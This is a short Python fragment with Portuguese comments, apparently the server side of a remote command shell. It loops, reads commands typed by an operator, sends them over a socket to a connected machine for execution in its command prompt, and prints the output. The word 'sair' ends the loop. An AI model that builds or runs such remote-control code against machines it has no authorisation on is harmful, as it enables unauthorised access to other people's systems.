#função para mandar instrução de execução de comando no cmd
def mandar_cmd(conn):
        while True:
            comando = input("\nServer: ")
            if comando.lower() == 'sair':
                 conn.sendall(comando.encode())
                 break
            conn.sendall(comando.encode())
            saida = conn.recv(2048).decode()
            print("\n" + saida)
